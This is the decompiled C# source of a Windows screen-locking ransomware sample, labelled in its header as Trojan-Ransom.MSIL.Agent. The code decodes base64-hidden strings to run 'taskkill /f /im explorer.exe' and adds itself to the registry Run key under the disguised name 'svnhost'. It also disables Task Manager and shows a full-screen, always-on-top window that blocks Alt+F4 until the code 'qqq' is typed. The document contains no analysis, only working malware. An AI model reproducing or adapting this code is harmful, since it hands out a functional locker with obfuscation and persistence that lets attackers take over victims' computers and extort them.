// Decompiled with JetBrains decompiler
// Type: wl.Form1
// Assembly: wl, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E6E8BCD7-4C40-4716-8DDC-1DCA1BA92943
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.MSIL.Agent.fg-232050875e567e0fd0ea5c44c025939e5bb7c1dc30952875adef2facf8e0e899.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace wl
{
  public class Form1 : Form
  {
    private IContainer components;
    private Button button1;
    private TextBox textBox1;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.button1 = new Button();
      this.textBox1 = new TextBox();
      this.SuspendLayout();
      this.button1.Anchor = AnchorStyles.Bottom;
      this.button1.Font = new Font("Microsoft Sans Serif", 11.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 204);
      this.button1.Location = new Point(248, 432);
      this.button1.Name = "button1";
      this.button1.Size = new Size(152, 36);
      this.button1.TabIndex = 0;
      this.button1.Text = "Разблокировать";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.textBox1.Anchor = AnchorStyles.Bottom;
      this.textBox1.Location = new Point(248, 406);
      this.textBox1.Name = "textBox1";
      this.textBox1.Size = new Size(152, 20);
      this.textBox1.TabIndex = 1;
      this.textBox1.TextChanged += new EventHandler(this.textBox1_TextChanged);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      this.BackgroundImageLayout = ImageLayout.Stretch;
      this.ClientSize = new Size(640, 480);
      this.Controls.Add((Control) this.textBox1);
      this.Controls.Add((Control) this.button1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.TopMost = true;
      this.WindowState = FormWindowState.Maximized;
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    public Form1()
    {
      this.InitializeComponent();
      this.KeyPreview = true;
    }

    public static void kil() => Application.Exit();

    public static void jui()
    {
      string str = "1";
      string subkey = "Software\\Microsoft\\Win" + "dows\\CurrentVersion\\Policies\\System";
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(subkey);
        subKey.SetValue("DisableTaskMgr", (object) str);
        subKey.Close();
      }
      catch (Exception ex)
      {
        if (34 <= Screen.PrimaryScreen.Bounds.Width)
          return;
        Form1.kil();
      }
    }

    protected override void OnKeyDown(KeyEventArgs e)
    {
      base.OnKeyDown(e);
      if (e.KeyCode != Keys.F4 || !e.Alt)
        return;
      e.Handled = true;
    }

    public static string mers(string data)
    {
      try
      {
        Decoder decoder = new UTF8Encoding().GetDecoder();
        byte[] bytes = Convert.FromBase64String(data);
        char[] chars = new char[decoder.GetCharCount(bytes, 0, bytes.Length)];
        decoder.GetChars(bytes, 0, bytes.Length, chars, 0);
        return new string(chars);
      }
      catch (Exception ex)
      {
        throw new Exception("Error in base64Decode" + ex.Message);
      }
    }

    public static string collaps(int id)
    {
      string str = "";
      if (id == 1)
        str = Form1.mers("c3ZuaG9zdA==");
      if (id == 2)
        str = Form1.mers("ZmdyZWVmbg==");
      if (id == 3)
        str = Form1.mers("U29mdHdhcmVcXE1pY3Jvc29mdFxc");
      if (id == 4)
        str = Form1.mers("XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuXFw=");
      if (id == 5)
        str = Form1.mers("dGFza2tpbGw=");
      if (id == 6)
        str = Form1.mers("Y21kLmV4ZQ==");
      if (id == 7)
        str = Form1.mers("L0Mg");
      if (id == 8)
        str = Form1.mers("IC9mIC9pbSBleHBsb3Jlci5leGU=");
      return str;
    }

    private void textBox1_TextChanged(object sender, EventArgs e)
    {
    }

    private void button1_Click(object sender, EventArgs e)
    {
      if (!(this.textBox1.Text == "qqq"))
        return;
      Application.Exit();
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      string str = Form1.collaps(5);
      Process.Start(Form1.collaps(6), Form1.collaps(7) + str + Form1.collaps(8));
      string name = Form1.collaps(1);
      string executablePath = Application.ExecutablePath;
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey(Form1.collaps(3) + Form1.collaps(4));
      try
      {
        if (Screen.PrimaryScreen.Bounds.Width > 58)
        {
          subKey.SetValue(name, (object) executablePath);
          subKey.Close();
        }
      }
      catch
      {
        if (Control.DefaultBackColor.ToString() == Form1.collaps(2))
        {
          int num = (int) MessageBox.Show("Error");
        }
      }
      Form1.jui();
    }
  }
}
